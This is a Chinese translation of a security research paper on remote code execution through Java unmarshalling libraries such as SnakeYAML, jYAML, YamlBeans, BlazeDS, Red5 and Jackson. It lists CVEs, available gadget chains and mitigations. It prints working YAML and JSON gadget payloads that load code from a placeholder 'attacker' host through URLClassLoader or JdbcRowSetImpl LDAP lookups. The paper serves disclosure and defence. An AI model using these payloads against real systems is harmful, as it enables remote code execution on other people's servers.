原文：
两年前(当前2019年，已为四年前)Chris Frohoff 和 Garbriel
Lawrence发表了他们关于java对象反序列化漏洞的研究，这可能引发了java历史上规模最大的一系列远程代码执行漏洞。对这一问题的研究表明，这些漏洞不仅仅表现为java序列化和XStream(一个Java对象和XML转换工具)的特性，也有一些可能影响其他机制。本文介绍了各种可以通过unmarshalling执行攻击者恶意代码的开源java
marshalling组件库的分析。研究表明，无论这个过程如何执行以及包含何种隐含的约束，大家都倾向采用类似的开发技术。尽管大多数描述的机制都没有比java序列化实现的功能更强，但是结果却更容易被利用-在一些情况下，jdk的标准库即可在反序列化过程中实现代码执行。  
(为了与java内置的序列化相冲突，本文的marshalling指任何将java的内部表示转换到可以存储、传输的机制)
**免责申明** :
这里所有提供的信息仅供学习目的。所有引用的漏洞已经负责任地通知向相关厂商。尽管所有的厂商已经被给予了大量时间，现阶段可能仍有部分漏洞还未被修复，然而，本文作者认为广泛的披露这些信息应该会产生更好的效果。
## 1 介绍
除了极少数例外，java marshallers
提供了将各自的目标格式转换到对象图（树）的方法。这允许用户使用结构化和适当类型的数据，这当然是java中最自然的方式。
在marshalling和unmarshalling过程中marshaller需要与source以及target
对象交互来设置或读取属性值。这种交互广泛的存在于javaBean约定中，这意味着通过getter 和 seter
来访问对象属性。其他机制直接访问实际的java字段。对象还可能有一种可以生产自然的自定义表示机制，通常，为了提高空间效率或增加表示能力，内置的某些类型转换不遵循这些规则。
本文明确的重点就是unmarshalling过程，攻击者更有可能控制该过程的输入。在第五节中，描述了一些可能杯攻击的marshalling组件。
在多数情况下,在unmarshalling时，预期的root对象已知--毕竟人们大多希望对接收到的数据做些事情。可以使用反射递归确认属性类型。然而许多具体实现，都没有忽略非预期的类型。java提供了继承和接口用来提供多态性，进而导致需要在某些具体表述中添加一些类型信息来保证正确恢复。
为攻击者提供一个某种类型来unmarshal，进而在执行该类型上的特定方法。显然，人们的预期时这些组件表现良好-- 那么是什么导致可能发生问题呢?
开源的java marshalling 库通常针对某一类型，列表如下：
  * SnakeYAML (YAML)
  * jYAML (YAML)
  * YamlBeans (YAML)
  * Apache Flex BlazeDS (AMF Action Message Format, originally developed by Adobe) 
  * Red5 IO AMF (AMF)
  * json-io (JSON)
  * Castor (XML)
  * Java XMLDecoder (XML)
  * Java Serialization (binary)
  * Kryo (binary)•Hessian/Burlap (binary/XML)
  * XStream (XML/various
Jackson 是一个通常遵循实际属性的实现例子。然而，他的多态unmarshalling 支持一种操作任意类型的模式。
没有这种风险行为的明显例外：
  * JAXB 需要所有的类型都已注册
  * 需要已定义模式或编译的机制(例如XmlBeans、Jibx、Protobuf)
  * GSON 需要一个特点root类型，遵循属性类型，多态机制需要提前注册
  * GWT-RPC 提供了类型信息，但自动构建了白名单。
## 2 工具
大多数gadget搜索都是[Serianalyzer](https://github.com/mbechler/serianalyzer/)的一点点增强版完成的。Serianalyzer,起初开发用于Java
反序列化分析，是一个静态字节码分析器，从一组初始方法出发，追踪各类原生方法潜在的可达路径。调整这些起始方法以匹配unmarshalling中可以完成的交互（可能寻找绕过可序列化的类型检查，以及针对Java序列化进行启发式调整），这也可以用于其他机制。
## 3 Marshalling 组件库
这里描述了各式 Marshalling
机制，对比了他们之间的相互影响以及unmarshall执行的各种检查。最基本的差别是他们如何设定对象的值，因此下面将区分使用Bean属性访问的机制和只使用直接字段访问的机制。
### 3.1 基于Bean 属性的 marshallers
基于Bean 属性的 marshallers
或多或少都遵守类型的API来阻止一个攻击者任意修改对象的状态，并且能重建的对象图比基于字段的marshallers重建少。但是，它们调用了setter方法，导致在unmarshalling时可能触发更多的代码。
#### 3.1.1 SnakeYAML
SnakeYAML 只允许公有构造函数和公有属性。它不需要相应的getter方法。它有一个允许通过攻击者提供的数据调用任意构造函数的特性。这使得攻击
ScriptEngine（甚至也可能影响更多，这是一个令人难以置信的攻击面）成为可能。
    !! javax.script.ScriptEngineManager [
        !!java.net.URLClassLoader  [[
            !!java.net.URL ["http :// attacker /"]
        ]]
    ]
通过 JdbcRowset 仅用属性访问也能实现攻击
    !!com.sun.rowset.JdbcRowSetImpl
        dataSourceName: ldap :// attacker/obj
        autoCommit: true
SnakeYAML 指定一个特定实际使用的root类型，然而并不检查嵌套的类型。
  * References
> cve-2016-9606 Resteasy
>
> CVE-2017-3159 Apache Camel
>
> CVE-2016-8744 Apache Brooklyn
  * 可用的payloads
    * ScriptEngine (4.16)
    * JdbcRowset (4.2)
    * C3P0RefDS (4.8)
    * C3P0WrapDS (4.9)
    * SpringPropFac (4.10)
    * JNDIConfig (4.7)
  * 修复、缓解措施
SnakeYAML 提供了一个SafeConstructor,禁用所有自定义类型。或者，白名单实现一个自定义Constructor。
#### 3.1.2 jYAML
jYAML 解析自定义类型的语法与 SnakeYAML 有些细微的差别，并且不支持任意构造函数调用。这个项目被抛弃了。它需要一个public
构造函数以及相应的 getter 方法。
jYAML 允许使用 相同的基于属性的和 SnakeYAML 相同的 payloads， 包括 JdbcRowset ：
    foo: !com.sun.rowset.JdbcRowSetImpl
        dataSourceName: ldap :// attacker/obj
        autoCommit: true
由于 getter 的特殊要求 SpringPropFac 不能触发。jYAML 不允许指定root类型，但他根本就没有检查。
  * 可用 payloads
    * JdbcRowset(4.2)
    * C3P0RefDs(4.8)
    * C3P0WrapDS(4.9)
  * 修复、缓解措施
似乎并没有提供一个机制实现白名单
#### 3.1.3 YamlBeans
YamlBeans 对自定义类型使用另一种语法。它仅允许配置过或注释过的构造函数被调用，它需要一个默认构造函数（不一定必须是public）以及相应的
getter 方法。YamlBeans 通过字段枚举一个类型的所有属性，意味着只有那些 setter 函数与字段名相关的才能被使用。 YamlBeans 中
JdbcRowset 不能被触发，因为需要的属性没有一个相应的字段与之匹配。 C3P0WrapDS 却任然能触发。
    !com.mchange.v2.c3p0.WrapperConnectionPoolDataSource
        userOverridesAsString: HexAsciiSerializedMap:
YamlBeans 允许指定 root 类型，但它事实上并不做检查。 YamlBeans 有一系列配置参数，例如 禁止non-public 构造函数
或者直接字段可用。
  * 可用 payloads
    * C3P0WrapDS(4.9)
  * 修复、缓解措施
似乎并没有提供一个机制实现白名单
#### 3.1.4 Apache Flex BlazeDS
Flex BlazeDS AMF unmarshallers 需要一个public 默认构造函数和public stters。（marshalling
的实现过程中需要getters；然而，没有那些的 payloads 通过一个自定义的 BeanProxy 也可以被构建，当然这个BeanProxy
也需要获得某些类型的属性排序）
AMF3/AMFx unmarshallers 支持 java.io.Externalizable 类型，这可以通过 RMIRef 来到达 Java
反序列化。（deserialization）。它们都内置了针对 javax.sql.RowSet 自定义子类的转换规则，这就意味着 JdbcRowset
不能被 unmarshalled。 其他可用的有效载荷包括 Spring-PropFac 和 C3P0WrapDS (如果他们被添加到路径中)。
不允许指定根类型，也不检查嵌套的属性类型。
  * References
> CVE-2017-3066 Adobe Coldfusion
>
> CVE-2017-5641 Apache BlazdDS
>
> CVE-2017-5641 VMWare VCenter
  * 可用 payloads
    * RMIRef(4.20)
    * C3P0WrapDS(4.9)
    * SpringPropFac(4.10)
  * 修复、缓解措施
可用通过DeserializationValidator 实现一个类型白名单。更新待版本4.7.3，默认开启白名单
#### 3.1.5 Red5 IO AMF
Red5 有自定义的 AMF unmarshallers ，与 BlazeDS 有些许不同。它们都需要一个默认的 public 构造器 和public
setters 。仅通过自定义标记接口支持外部化类型。
但是，它没有实现 javax.sql.RowSet 自定义逻辑， 因此可以通过 JdbcRowset 、 SpringPropFac 和
C3P0WrapDs 实现攻击， 都依赖于 Red5 服务。
  * References
> CVE-2017-5878 Red5 , Apache OpenMeetings
  * 可用 payloads
    * JdbsRowset(4.2)
    * C3P0WrapDS(4.9)
    * SpringPropFac(4.10)
#### 3.1.6 Jackson
Jackson
,在它的默认配置中，执行严格的运行时类型检查，包括一般类型收集和禁止特殊、任意类型，因此在默认配置中它是无法被影响的。但是，它有一项配置参数来启用多态
[unmarshalling](http://wiki.fasterxml.com/JacksonPolymorphicDeserialization),包括使用
java 类名的选项。Jaclson 需要一个默认构造器和setter 方法（不区分public 和private ，均可行）。
类型检查在这些模式下也起作用，所有攻击也需要一个 使用supertype的 readValue() 或具有该类型的嵌套字段、集合。
这里有类型信息的一系列表现形式，都表现为相同的行为。因此，有多种方法来开启这种多态性，全局的
ObjectMapper->enableDefaultTyping(),一个自定义的 TypeResolverBuilder ，或者使用 在字段上使用
@JsonTypeInfo 注释。取决于 Jackson的版本，也行可以使用 JdbsRowset 进行攻击：
    ["com.sun.rowset.JdbcRowSetImpl ",{
        "dataSourceName ":
        "ldap :// attacker/obj",
        "autoCommit" : true
    }]
但是，那并不会在 2.7.0以后版本生效, 因为 Jackson 检查是否定义了多个冲突的setter方法， JdbcRowSetTmpl 有 3个对应
'matchColumn' 属性的setter 。Jackson 2.7.0 版本为这种场景添加了一些分辨逻辑。不幸的事，这个分辨逻辑有bug：依赖于
Class->getMethods() 的顺序，然而这是随机的（但缓存使用 SoftReference
，所以只要进程一直运行，就不会得到另一次机会），检查因此失效。
除此之外，Jackson 还可以使用 SpringPropFac, SpringB-FAdv, C3P0RefDS, C3P0WrapDS
，RMIRemoteObj 进行攻击。
  * References
> REPORTED Amazon AWS Simple Workflow Library
>
> REPORTED Redisson
>
> cve-2016-8749 Apache Camel